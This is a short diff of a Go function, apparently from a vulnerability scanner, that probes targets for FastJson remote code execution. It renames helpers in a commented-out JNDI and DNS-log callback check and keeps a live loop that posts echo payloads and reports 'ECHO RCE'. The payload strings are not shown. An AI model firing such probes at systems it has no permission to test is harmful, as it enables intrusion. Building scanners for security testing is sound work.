@@ -13,25 +13,25 @@ func Check(u string, finalURL string) string {
 		header := make(map[string]string)
 		header["Content-Type"] = "application/json"
 		//randomstr := util.RandomStr(10)
-		//if (pkg.CeyeApi != "" && pkg.CeyeDomain != "") || jndi.JndiAddress != "" {
+		//if (yak.CeyeApi != "" && yak.CeyeDomain != "") || jndi.JndiAddress != "" {
 		//	for _, payload := range fastjsonJndiPayloads {
 		//		var uri string
 		//		if jndi.JndiAddress != "" {
 		//			uri = jndi.JndiAddress + "/" + randomstr + "/"
-		//		} else if pkg.CeyeApi != "" && pkg.CeyeDomain != "" {
-		//			uri = randomstr + "." + pkg.CeyeDomain
+		//		} else if yak.CeyeApi != "" && yak.CeyeDomain != "" {
+		//			uri = randomstr + "." + yak.CeyeDomain
 		//		}
-		//		_, _ = pkg.Request(jsonurl, "POST", strings.Replace(payload, "dnslog-url", uri, -1), false, header)
+		//		_, _ = yak.Request(jsonurl, "POST", strings.Replace(payload, "dnslog-url", uri, -1), false, header)
 		//	}
 		//	if jndi.JndiAddress != "" {
 		//		if jndi.Jndilogchek(randomstr) {
-		//			pkg.GoPocLog(fmt.Sprintf("Found vuln FastJson JNDI RCE |%s\n", u))
+		//			yak.GoPocLog(fmt.Sprintf("Found vuln FastJson JNDI RCE |%s\n", u))
 		//			return "JNDI RCE"
 		//		}
 		//	}
-		//	if pkg.CeyeApi != "" && pkg.CeyeDomain != "" {
-		//		if pkg.Dnslogchek(randomstr) {
-		//			pkg.GoPocLog(fmt.Sprintf("Found vuln FastJson JNDI RCE |%s\n", u))
+		//	if yak.CeyeApi != "" && yak.CeyeDomain != "" {
+		//		if yak.Dnslogchek(randomstr) {
+		//			yak.GoPocLog(fmt.Sprintf("Found vuln FastJson JNDI RCE |%s\n", u))
 		//			return "JNDI RCE"
 		//		}
 		//	}
@@ -40,7 +40,7 @@ func Check(u string, finalURL string) string {
 		for _, payload := range fastjsonEchoPayloads {
 			if req, err := httpx.Request(jsonurl, "POST", payload, false, header); err == nil {
 				if strings.Contains(req.Body, "jsonvuln") {
-					//pkg.GoPocLog(fmt.Sprintf("Found vuln FastJson ECHO RCE |%s\n", u))
+					//yak.GoPocLog(fmt.Sprintf("Found vuln FastJson ECHO RCE |%s\n", u))
 					return "ECHO RCE"
 				}
 			}
